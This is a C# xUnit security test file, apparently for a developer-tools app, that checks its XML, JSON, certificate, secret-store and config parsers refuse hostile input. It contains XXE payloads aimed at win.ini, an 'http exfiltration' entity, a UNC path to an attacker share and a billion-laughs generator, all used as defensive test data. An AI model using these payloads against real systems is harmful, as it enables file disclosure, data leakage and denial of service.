using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using SwiftX.Models;
using SwiftX.Services;
using SwiftX.Services.Formats;
using Xunit;

namespace SwiftX.Tests.Security;

/// <summary>
/// The security properties SwiftX's own design document commits to, asserted rather than assumed.
/// <para>
/// Everything here is about input the app did not author: a document pasted from a log, a
/// certificate dropped from a download folder, a configuration file picked from disk. The design
/// document's §21 (entity-expansion and XXE mitigations) and §22 (parse-bomb and allocation
/// guards) are the contracts under test, and the class-level comment on <c>XmlFormat</c> says
/// outright that they are "enforced by tests, not by convention" — this file and
/// <c>XmlFormatSecurityTests</c> are what that sentence is referring to.
/// </para>
/// <para>
/// The recurring theme is that a hardening measure is only real if the failure is <em>reported</em>.
/// A parser that refuses a hostile file by throwing something its caller does not catch has not
/// protected anything — it has moved the crash. So most assertions here check for a clean result
/// object or a caught exception type, not merely for the absence of the attack's effect.
/// </para>
/// </summary>
public class SecurityHardeningTests
{
    // =========================================================================================
    // 1. XML external entities (XXE)
    // =========================================================================================

    /// <summary>
    /// Every shape of external-entity reference, all blocked by the same lever: DTDs are refused
    /// outright, so there is no declaration for a reference to resolve against. Testing the
    /// variants separately matters because a reader hardened only against
    /// <c>DtdProcessing.Parse</c> plus a null resolver still differs from one that refuses the
    /// DOCTYPE — and a future change that relaxed the first would silently pass a test written
    /// only against the classic file:// case.
    /// </summary>
    [Theory]
    [InlineData("classic file read",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///C:/Windows/win.ini\">]><r>&x;</r>")]
    [InlineData("http exfiltration",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://127.0.0.1:1/leak\">]><r>&x;</r>")]
    [InlineData("public identifier",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x PUBLIC \"-//x//EN\" \"file:///C:/Windows/win.ini\">]><r>&x;</r>")]
    [InlineData("parameter entity",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"file:///C:/Windows/win.ini\">%p;]><r/>")]
    [InlineData("external dtd subset",
        "<?xml version=\"1.0\"?><!DOCTYPE r SYSTEM \"file:///C:/Windows/win.ini\"><r/>")]
    [InlineData("unc path",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"\\\\\\\\attacker\\\\share\\\\p\">]><r>&x;</r>")]
    public void ExternalEntities_OfEveryShape_AreRefusedRatherThanResolved(string variant, string xml)
    {
        Assert.NotEmpty(XmlFormat.Instance.Validate(xml));

        var formatted = XmlFormat.Instance.Format(xml, FormatOptions.Default);
        Assert.False(formatted.Success, $"{variant} was accepted");
        // Invalid input must never clear what the user had.
        Assert.Empty(formatted.Text);

        Assert.False(XmlFormat.Instance.Minify(xml).Success, $"{variant} was accepted by Minify");
        Assert.ThrowsAny<Exception>(() => XmlFormat.Instance.ToCanonical(xml));
    }

    /// <summary>
    /// The refusal must not leak what it refused. A message quoting the resolved content of an
    /// external entity would defeat the guard by another route, so the diagnostic is checked for
    /// the one string every one of these payloads is trying to reach.
    /// </summary>
    [Fact]
    public void TheRefusalMessage_DoesNotEchoTheTargetedFilesContents()
    {
        const string xxe =
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///C:/Windows/win.ini\">]><r>&x;</r>";

        var diagnostics = XmlFormat.Instance.Validate(xxe);

        Assert.NotEmpty(diagnostics);
        foreach (var diagnostic in diagnostics)
        {
            Assert.DoesNotContain("[fonts]", diagnostic.Message, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("[extensions]", diagnostic.Message, StringComparison.OrdinalIgnoreCase);
        }
    }

    // =========================================================================================
    // 2. Entity expansion and parse bombs
    // =========================================================================================

    /// <summary>
    /// Billion laughs at full strength. The classic payload expands to roughly 10^9 characters
    /// through nine levels of internal entity; refusing the DOCTYPE stops it before the first
    /// expansion, which is why this returns in milliseconds rather than exhausting memory.
    /// </summary>
    [Fact]
    public void BillionLaughs_AtFullDepth_IsRefusedBeforeAnyExpansion()
    {
        var sb = new StringBuilder();
        sb.Append("<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\">");
        for (int level = 1; level <= 9; level++)
        {
            sb.Append("<!ENTITY lol").Append(level).Append(" \"");
            for (int i = 0; i < 10; i++)
                sb.Append("&lol").Append(level == 1 ? "" : (level - 1).ToString()).Append(';');
            sb.Append("\">");
        }
        sb.Append("]><lolz>&lol9;</lolz>");

        var result = XmlFormat.Instance.Format(sb.ToString(), FormatOptions.Default);

        Assert.False(result.Success);
        Assert.NotEmpty(result.Diagnostics);
    }

    /// <summary>
    /// The nesting ceiling, from the security side rather than the crash side. §22's promise is
    /// that an input past a limit is "refused with a clear, specific message — never an OOM, never
    /// a hang", so the message has to name the limit rather than being a bare parse error.
    /// </summary>
    [Fact]
    public void NestingBomb_IsRefusedWithAMessageThatNamesTheLimit()
    {
        var bomb = string.Concat(Enumerable.Repeat("<a>", 100_000)) + "x" +
                   string.Concat(Enumerable.Repeat("</a>", 100_000));

        var diagnostics = XmlFormat.Instance.Validate(bomb);

        Assert.NotEmpty(diagnostics);
        Assert.Contains(XmlFormat.MaxDepth.ToString(), diagnostics[0].Message);
    }

    /// <summary>
    /// The JSON parser's own depth ceiling, and the fact that it is reported rather than thrown
    /// past the caller.
    /// </summary>
    [Fact]
    public void JsonNestingBomb_IsReportedAsADiagnostic()
    {
        var bomb = string.Concat(Enumerable.Repeat("[", 100_000)) + "1" +
                   string.Concat(Enumerable.Repeat("]", 100_000));

        var result = JsonFormat.Instance.Format(bomb, FormatOptions.Default);

        Assert.False(result.Success);
        Assert.NotEmpty(result.Diagnostics);
    }

    // =========================================================================================
    // 3. Secrets at rest
    // =========================================================================================

    /// <summary>
    /// <c>SecureValueStore</c>'s central claim is that the whole file is encrypted — <em>key names
    /// included</em>, because "AWS_SECRET_KEY" or "Prod DB password" is sensitive metadata even
    /// with the value hidden. This asserts it against the actual bytes on disk rather than against
    /// the class comment.
    /// </summary>
    [Fact]
    public void SecureValues_OnDisk_LeakNeitherValuesNorKeyNames()
    {
        const string tellTaleKey = "PROD_DATABASE_ROOT_PASSWORD";
        const string tellTaleValue = "hunter2-correct-horse-battery-staple";

        SecureValueStore.Save(
        [
            new SecureValueEntry { Id = "a", Key = tellTaleKey, Value = tellTaleValue },
        ]);

        var path = Path.Combine(RingStore.DataDirectory, "secure-values.json");
        Assert.True(File.Exists(path));

        var raw = File.ReadAllText(path);
        Assert.DoesNotContain(tellTaleValue, raw, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain(tellTaleKey, raw, StringComparison.OrdinalIgnoreCase);

        // And the raw bytes, in case the text comparison above is ever defeated by an encoding
        // change. This is a genuine subsequence search: the collection overloads of
        // Assert.DoesNotContain treat the needle as a single element, so passing two byte arrays
        // to one compiles and asserts nothing useful.
        var bytes = File.ReadAllBytes(path);
        Assert.False(ContainsSequence(bytes, Encoding.UTF8.GetBytes(tellTaleValue)),
            "the secret's UTF-8 bytes appear verbatim in the store");
        Assert.False(ContainsSequence(bytes, Encoding.Unicode.GetBytes(tellTaleValue)),
            "the secret's UTF-16 bytes appear verbatim in the store");

        // Round-trips for the owning user.
        var loaded = SecureValueStore.Load();
        Assert.Equal(tellTaleValue, Assert.Single(loaded).Value);
    }

    /// <summary>
    /// A store whose ciphertext has been altered — by disk corruption, by another user's DPAPI
    /// scope, or by tampering — must degrade to "no entries" rather than throwing out of
    /// <c>Load</c>, which is called during window construction where an exception has no caller.
    /// </summary>
    [Fact]
    public void SecureValues_WithATamperedBlob_LoadEmptyRatherThanThrowing()
    {
        SecureValueStore.Save([new SecureValueEntry { Id = "a", Key = "k", Value = "v" }]);
        var path = Path.Combine(RingStore.DataDirectory, "secure-values.json");

        using (var document = JsonDocument.Parse(File.ReadAllText(path)))
        {
            var blob = document.RootElement.GetProperty("Protected").GetString()!;
            var bytes = Convert.FromBase64String(blob);
            // Flip a byte well inside the ciphertext, past the DPAPI header.
            bytes[bytes.Length / 2] ^= 0xFF;
            File.WriteAllText(path, JsonSerializer.Serialize(new
            {
                Version = 2,
                Protected = Convert.ToBase64String(bytes),
            }));
        }

        var loaded = Record.Exception(() => SecureValueStore.Load());

        Assert.Null(loaded);
        Assert.Empty(SecureValueStore.Load());
    }

    /// <summary>Garbage where the encrypted blob should be, which is the non-adversarial version
    /// of the same failure.</summary>
    [Theory]
    [InlineData("{\"Version\":2,\"Protected\":\"not-base64-at-all!!!\"}")]
    [InlineData("{\"Version\":2,\"Protected\":\"\"}")]
    [InlineData("{\"Version\":2}")]
    [InlineData("not json at all")]
    [InlineData("")]
    public void SecureValues_WithAMalformedFile_LoadEmptyRatherThanThrowing(string contents)
    {
        var path = Path.Combine(RingStore.DataDirectory, "secure-values.json");
        Directory.CreateDirectory(RingStore.DataDirectory);
        File.WriteAllText(path, contents);

        var thrown = Record.Exception(() => SecureValueStore.Load());

        Assert.Null(thrown);
        Assert.Empty(SecureValueStore.Load());
    }

    /// <summary>
    /// The DPAPI blob is bound to the current user account, so it is not portable ciphertext. This
    /// pins the property the store's threat model rests on: the file alone, copied to another
    /// account, is not enough.
    /// </summary>
    [Fact]
    public void DpapiProtectedData_IsBoundToTheCurrentUser_NotJustObfuscated()
    {
        var plaintext = Encoding.UTF8.GetBytes("a secret");
        var protectedBytes = ProtectedData.Protect(plaintext, null, DataProtectionScope.CurrentUser);

        Assert.NotEqual(plaintext, protectedBytes);
        // Entropy-free round trip works for this user.
        Assert.Equal(plaintext, ProtectedData.Unprotect(protectedBytes, null, DataProtectionScope.CurrentUser));
        // A different entropy is a different key: the same blob no longer opens.
        Assert.ThrowsAny<CryptographicException>(
            () => ProtectedData.Unprotect(protectedBytes, [1, 2, 3], DataProtectionScope.CurrentUser));
    }

    /// <summary>Masking is what is shown on screen, so it must not reveal most of a short secret
    /// nor the middle of a long one.</summary>
    [Fact]
    public void ValueMasking_NeverRevealsTheInteriorOfASecret()
    {
        const string secret = "SUPER_SECRET_VALUE_1234567890";
        var masked = ValueMasking.Mask(secret);

        Assert.DoesNotContain("SECRET", masked, StringComparison.Ordinal);
        Assert.NotEqual(secret, masked);
        Assert.Equal(secret.Length, masked.Length);
        Assert.StartsWith(secret[..3], masked, StringComparison.Ordinal);
        Assert.EndsWith(secret[^3..], masked, StringComparison.Ordinal);
    }

    /// <summary>Whether <paramref name="needle"/> appears as a contiguous run inside
    /// <paramref name="haystack"/>.</summary>
    private static bool ContainsSequence(byte[] haystack, byte[] needle)
    {
        if (needle.Length == 0 || needle.Length > haystack.Length)
            return false;

        for (int start = 0; start <= haystack.Length - needle.Length; start++)
        {
            if (haystack.AsSpan(start, needle.Length).SequenceEqual(needle))
                return true;
        }
        return false;
    }

    // =========================================================================================
    // 4. Untrusted binary: certificates and keystores
    // =========================================================================================

    /// <summary>
    /// <c>CertificateReader</c> documents "never throws" and is reached from an <c>async void</c>
    /// drop handler, where a thrown exception is an unhandled one. This fuzzes it with structured
    /// garbage — plausible magic bytes followed by nonsense — rather than uniform random noise,
    /// since the interesting paths are the ones that get past format detection.
    /// </summary>
    [Fact]
    public void CertificateReader_OnStructuredGarbage_AlwaysReturnsAResult()
    {
        var random = new Random(20260907);
        byte[][] leaders =
        [
            [0xFE, 0xED, 0xFE, 0xED],                    // JKS magic
            [0xCE, 0xCE, 0xCE, 0xCE],                    // JCEKS magic
            [0x30, 0x82, 0x0A, 0x00],                    // DER SEQUENCE
            Encoding.ASCII.GetBytes("-----BEGIN CERTIFICATE-----\n"),
            Encoding.ASCII.GetBytes("-----BEGIN PKCS7-----\n"),
            [],
        ];

        foreach (var leader in leaders)
        {
            for (int trial = 0; trial < 25; trial++)
            {
                var tail = new byte[random.Next(0, 4096)];
                random.NextBytes(tail);
                var payload = leader.Concat(tail).ToArray();

                var thrown = Record.Exception(() => CertificateReader.Read(payload, password: null));
                Assert.Null(thrown);

                var withPassword = Record.Exception(() => CertificateReader.Read(payload, password: "guess"));
                Assert.Null(withPassword);
            }
        }
    }

    /// <summary>
    /// Truncation at every prefix length of a well-formed keystore header. A length-prefixed
    /// binary format is at its most dangerous when the length is present and the data is not.
    /// </summary>
    [Fact]
    public void JksReader_OnEveryTruncationOfAValidHeader_ReportsRatherThanThrows()
    {
        byte[] header =
        [
            0xFE, 0xED, 0xFE, 0xED,             // magic
            0x00, 0x00, 0x00, 0x02,             // version
            0x00, 0x00, 0x00, 0x01,             // one entry
            0x00, 0x00, 0x00, 0x02,             // trusted certificate entry
            0x00, 0x05, (byte)'a', (byte)'l', (byte)'i', (byte)'a', (byte)'s',
            0x00, 0x00, 0x01, 0x8D, 0x00, 0x00, 0x00, 0x00,   // timestamp
            0x00, 0x05, (byte)'X', (byte)'.', (byte)'5', (byte)'0', (byte)'9',
            0x00, 0x00, 0x00, 0x10,             // certificate length
        ];

        for (int length = 0; length <= header.Length; length++)
        {
            var truncated = header.Take(length).ToArray();
            var thrown = Record.Exception(() => JksReader.TryParse(truncated));
            Assert.Null(thrown);
        }
    }

    /// <summary>
    /// A wrong password must be a reported outcome, not a thrown one, and must be distinguishable
    /// from "this file needs a password at all" so the page can prompt correctly.
    /// </summary>
    [Fact]
    public void Pkcs12_WithTheWrongPassword_ReportsRatherThanThrows()
    {
        using var key = System.Security.Cryptography.RSA.Create(2048);
        var request = new System.Security.Cryptography.X509Certificates.CertificateRequest(
            "CN=SwiftX Security Test", key,
            System.Security.Cryptography.HashAlgorithmName.SHA256,
            System.Security.Cryptography.RSASignaturePadding.Pkcs1);
        using var certificate = request.CreateSelfSigned(
            DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(1));
        var pfx = certificate.Export(
            System.Security.Cryptography.X509Certificates.X509ContentType.Pkcs12, "right-password");

        var wrong = CertificateReader.Read(pfx, "wrong-password");
        Assert.False(wrong.Success);
        Assert.True(wrong.NeedsPassword);

        var right = CertificateReader.Read(pfx, "right-password");
        Assert.True(right.Success);
        Assert.NotEmpty(right.Entries);
    }

    // =========================================================================================
    // 5. Configuration import
    // =========================================================================================

    /// <summary>
    /// Import accepts any path the user picks, so the file it reads is untrusted whatever the
    /// picker suggested. A malformed or hostile configuration must come back as null — the
    /// "keep what you had" signal — rather than throwing or half-applying.
    /// </summary>
    [Theory]
    [InlineData("")]
    [InlineData("null")]
    [InlineData("[]")]
    [InlineData("{}")]
    [InlineData("{\"Rings\":[]}")]
    [InlineData("{\"Rings\":null}")]
    [InlineData("not json")]
    [InlineData("{\"Rings\":[{\"Items\":[{\"Kind\":\"NotARealKind\"}]}]}")]
    public void RingStore_ImportingAMalformedConfiguration_ReturnsNullRatherThanThrowing(string contents)
    {
        var path = Path.Combine(RingStore.DataDirectory, "import-" + Guid.NewGuid().ToString("N") + ".json");
        File.WriteAllText(path, contents);

        var thrown = Record.Exception(() => RingStore.ImportFrom(path));

        Assert.Null(thrown);
        Assert.Null(RingStore.ImportFrom(path));
    }

    /// <summary>A path that does not exist is the same "no" as a malformed file, not an
    /// exception.</summary>
    [Fact]
    public void RingStore_ImportingAMissingFile_ReturnsNull()
    {
        var missing = Path.Combine(RingStore.DataDirectory, "definitely-not-here.json");

        Assert.Null(Record.Exception(() => RingStore.ImportFrom(missing)));
        Assert.Null(RingStore.ImportFrom(missing));
    }

    /// <summary>
    /// A deeply nested configuration file is a parse bomb aimed at start-up rather than at a tool.
    /// <c>System.Text.Json</c>'s default depth limit is what stops it, and it has to surface as
    /// the same null rather than as a throw out of <c>Load</c>.
    /// </summary>
    [Fact]
    public void RingStore_ImportingADepthBomb_ReturnsNullRatherThanThrowing()
    {
        var bomb = string.Concat(Enumerable.Repeat("{\"a\":", 20_000)) + "1" +
                   string.Concat(Enumerable.Repeat("}", 20_000));
        var path = Path.Combine(RingStore.DataDirectory, "bomb.json");
        File.WriteAllText(path, bomb);

        Assert.Null(Record.Exception(() => RingStore.ImportFrom(path)));
        Assert.Null(RingStore.ImportFrom(path));
    }

    // =========================================================================================
    // 6. Text codecs
    // =========================================================================================

    /// <summary>
    /// Base64 decode is deliberately forgiving on the way in, which is a place to accidentally
    /// accept something that later blows up. Bytes that are not valid UTF-8 must be reported, not
    /// silently replaced with U+FFFD, or a decoded secret would be quietly corrupted.
    /// </summary>
    [Fact]
    public void Base64_DecodingNonUtf8Bytes_ReportsRatherThanSubstitutingReplacementCharacters()
    {
        var invalidUtf8 = Convert.ToBase64String([0xC3, 0x28, 0xA0, 0xA1]);

        var result = Base64Codec.Decode(invalidUtf8);

        Assert.False(result.Success);
        Assert.DoesNotContain("\uFFFD", result.Text);
    }

    /// <summary>Malformed input of every shape comes back as a failed result rather than an
    /// exception, since this runs on every keystroke in the Base64 tool.</summary>
    [Theory]
    [InlineData("!!!!not base64!!!!")]
    [InlineData("=")]
    [InlineData("A")]
    [InlineData("AB=C")]
    [InlineData("\u0000\u0001\u0002")]
    public void Base64_OnMalformedInput_FailsCleanly(string input)
    {
        var thrown = Record.Exception(() => Base64Codec.Decode(input));

        Assert.Null(thrown);
    }

    /// <summary>
    /// The paste-cleanup pass unescapes <c>\\uXXXX</c> sequences, which means it parses
    /// attacker-chosen hex. A truncated or non-hex escape at the very end of the buffer is the
    /// shape that reads past the end.
    /// </summary>
    [Theory]
    [InlineData("\\u")]
    [InlineData("\\u0")]
    [InlineData("\\u00")]
    [InlineData("\\u004")]
    [InlineData("\\uZZZZ")]
    [InlineData("\\u{00}")]
    [InlineData("\\")]
    [InlineData("\\\\u0041")]
    public void InputSanitizer_OnTruncatedOrInvalidUnicodeEscapes_DoesNotReadPastTheEnd(string input)
    {
        var thrown = Record.Exception(() => InputSanitizer.Clean(input));

        Assert.Null(thrown);
    }

    // =========================================================================================
    // 7. Input ceilings
    // =========================================================================================

    /// <summary>
    /// §22's ceilings exist so a file is refused before it is read, not after. The check is made
    /// against the file's metadata, so an oversized file must be refused without its contents ever
    /// being loaded — this asserts the refusal and the message that names the limit.
    /// </summary>
    [Fact]
    public async Task InputLimits_RefuseAnOversizedFile_WithoutReadingIt()
    {
        var path = Path.Combine(RingStore.DataDirectory, "oversized.bin");

        // A sparse-ish file: set the length without writing the bytes, so the test stays quick
        // while the metadata the guard reads says it is past the ceiling.
        using (var stream = new FileStream(path, FileMode.Create, FileAccess.Write))
            stream.SetLength(InputLimits.MaxTextBytes + 1);

        var result = await InputLimits.ReadTextAsync(path);

        Assert.False(result.Ok);
        Assert.Empty(result.Text);
        Assert.NotEmpty(result.Error);
    }

    /// <summary>A file inside the ceiling is read normally, so the guard is a ceiling and not a
    /// blanket refusal.</summary>
    [Fact]
    public async Task InputLimits_ReadAFileInsideTheCeiling_Normally()
    {
        var path = Path.Combine(RingStore.DataDirectory, "small.json");
        await File.WriteAllTextAsync(path, "{\"ok\":true}");

        var result = await InputLimits.ReadTextAsync(path);

        Assert.True(result.Ok);
        Assert.Contains("\"ok\"", result.Text);
    }

    /// <summary>An unreadable path is reported the same way an oversized one is, because the
    /// caller has the same single thing to do with either.</summary>
    [Fact]
    public async Task InputLimits_OnAMissingFile_ReportRatherThanThrow()
    {
        var result = await InputLimits.ReadTextAsync(
            Path.Combine(RingStore.DataDirectory, "no-such-file.txt"));

        Assert.False(result.Ok);
        Assert.NotEmpty(result.Error);
    }
}
